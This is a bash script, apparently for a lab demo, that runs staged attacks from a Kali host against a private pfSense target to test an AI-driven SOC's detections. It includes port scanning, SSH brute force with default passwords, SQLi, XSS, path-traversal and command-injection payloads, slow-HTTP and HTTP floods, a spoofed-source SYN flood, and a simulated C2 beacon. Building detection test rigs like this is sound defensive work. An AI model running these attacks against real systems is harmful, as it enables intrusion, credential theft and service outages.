#!/bin/bash
# =====================================================================
# AI-SOC DEMO ATTACK ORCHESTRATOR — Kali Linux side
# Host    : Kali (192.168.168.23)
# Target  : 192.168.168.254 (pfSense WAN) → routes to DMZ web server
# Mode    : HYBRID — 1 real source IP + spoofed multi-IP waves
#
# Each phase is timed so the SOC dashboard tells a clear story to the
# review board. Total runtime ≈ 12 minutes.
#
# REQUIREMENTS (install on Kali):
#   apt install -y hping3 nmap hydra nikto slowhttptest curl
#   pip3 install slowloris
# =====================================================================
set -e

TARGET="${TARGET:-192.168.168.254}"
WEB_TARGET="${WEB_TARGET:-192.168.168.254}"   # pfSense NATs to 172.16.16.30
REAL_IP="192.168.168.23"
LOGFILE="/tmp/ai-soc-demo-$(date +%Y%m%d-%H%M%S).log"

# Color output
R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'; B='\033[1;34m'; N='\033[0m'

phase() { echo -e "\n${B}=== [$(date +%H:%M:%S)] PHASE $1: $2 ===${N}" | tee -a "$LOGFILE"; }
note()  { echo -e "${Y}>>>${N} $*" | tee -a "$LOGFILE"; }
ok()    { echo -e "${G}✓${N} $*" | tee -a "$LOGFILE"; }

trap 'echo -e "\n${R}[!] Aborted, killing background jobs${N}"; kill $(jobs -p) 2>/dev/null; exit 130' INT

cat <<EOF | tee "$LOGFILE"
╔══════════════════════════════════════════════════════════════╗
║      AI-SOC DEMO ATTACK SCENARIO — C1NE.03                  ║
║      Target: $TARGET                                ║
║      Source: $REAL_IP (real) + spoofed waves          ║
║      Log   : $LOGFILE                  ║
╚══════════════════════════════════════════════════════════════╝
EOF

# ---------------------------------------------------------------------
phase 1 "RECONNAISSANCE — Real source, slow & quiet (90s)"
# Goal: dashboard shows a single suspicious source doing recon.
# AI should correlate via Zeek and issue SUSPICIOUS verdict.
note "nmap SYN scan, top 1000 ports, T3 timing"
nmap -sS -T3 --top-ports 1000 -Pn "$TARGET" -oN /tmp/nmap-recon.txt >/dev/null &
NMAP_PID=$!
sleep 90
kill $NMAP_PID 2>/dev/null || true
ok "Recon phase complete — expect PortScan SUSPICIOUS in dashboard"

# ---------------------------------------------------------------------
phase 2 "BRUTE-FORCE SSH — Real source, hydra (60s)"
# Goal: AI sees repeated failed SSH from one IP → SSH-Patator ALERT.
note "hydra SSH brute force (small wordlist, 4 threads)"
cat > /tmp/users.txt <<EOF
root
admin
ubuntu
EOF
cat > /tmp/passes.txt <<EOF
123456
password
admin
toor
P@ssw0rd
EOF
timeout 60 hydra -L /tmp/users.txt -P /tmp/passes.txt -t 4 -f ssh://"$TARGET" >/dev/null 2>&1 || true
ok "SSH brute-force complete — expect SSH-Patator ALERT (high confidence)"

sleep 5

# ---------------------------------------------------------------------
phase 3 "WEB ATTACKS — Real source, nikto + manual SQLi/XSS (60s)"
note "nikto fast scan against web target"
timeout 45 nikto -h "http://$WEB_TARGET" -Tuning 1234567890ab -nointeractive >/dev/null 2>&1 || true

note "manual SQLi & XSS payloads (each will hit dedicated rules)"
for payload in \
  "/?id=1' UNION SELECT username,password FROM users--" \
  "/?id=1 OR 1=1" \
  "/search?q=<script>alert('xss')</script>" \
  "/page?file=../../../../etc/passwd" \
  "/admin?cmd=;cat%20/etc/passwd"
do
  curl -s -o /dev/null --max-time 3 "http://${WEB_TARGET}${payload}" || true
  sleep 1
done
ok "Web attacks complete — expect Web Attack ALERT cluster"

# ---------------------------------------------------------------------
phase 4 "DOS — Slowloris from real source (60s)"
note "slowhttptest slow-POST attack, 200 sockets"
timeout 60 slowhttptest -c 200 -B -i 10 -r 50 -s 8192 -u "http://$WEB_TARGET" -x 24 -p 3 >/dev/null 2>&1 || true
ok "Slow HTTP DoS complete — expect DoS Slowhttptest/Slowloris ALERT"

sleep 5

# ---------------------------------------------------------------------
phase 5 "DDoS WAVE 1 — hping3 SYN flood with SPOOFED random sources (45s)"
# Goal: dashboard Top Sources panel lights up with 50-200 different IPs.
# AI must NOT block all of them blindly — should flag pattern as DDoS.
note "hping3 --rand-source SYN flood, 1000 pps for 45s"
timeout 45 hping3 -c 45000 -d 120 -S -w 64 -p 80 --flood --rand-source "$TARGET" >/dev/null 2>&1 || true
ok "DDoS wave 1 complete — expect ~50-200 unique src_ip in Top Sources"

sleep 10

# ---------------------------------------------------------------------
phase 6 "DDoS WAVE 2 — HULK HTTP flood, real source (45s)"
# Goal: ML model classifies this distinctly as 'DoS Hulk'.
note "GoldenEye-style HTTP flood from $REAL_IP"
if command -v goldeneye >/dev/null 2>&1; then
  timeout 45 goldeneye "http://$WEB_TARGET" -w 50 -s 200 >/dev/null 2>&1 || true
else
  # Fallback: ab-style flood
  for i in $(seq 1 2000); do
    curl -s -o /dev/null --max-time 1 -H "Cache-Control: no-cache" \
      "http://$WEB_TARGET/?cb=$RANDOM" &
    [ $((i % 50)) -eq 0 ] && wait
  done
  wait
fi
ok "Hulk-style flood complete — expect DoS Hulk ALERT (high confidence)"

# ---------------------------------------------------------------------
phase 7 "C2 BEACON SIMULATION — periodic curl with bot UA (60s)"
# Goal: AI flags low-and-slow bot activity (Bot class).
note "Beacon every 8s with python-requests UA for 60s"
END=$((SECONDS + 60))
while [ $SECONDS -lt $END ]; do
  curl -s -o /dev/null --max-time 2 \
    -A "python-requests/2.28.0" \
    -H "X-Beacon-Id: $(uuidgen 2>/dev/null || echo $RANDOM)" \
    "http://$WEB_TARGET/api/heartbeat" || true
  sleep 8
done
ok "C2 beacon complete — expect Bot ALERT (medium confidence)"

# ---------------------------------------------------------------------
echo -e "\n${G}╔══════════════════════════════════════════════════════════════╗${N}"
echo -e "${G}║  DEMO COMPLETE. Check SOC dashboard for full incident chain. ║${N}"
echo -e "${G}╚══════════════════════════════════════════════════════════════╝${N}"
echo -e "Log saved to: ${B}$LOGFILE${N}"
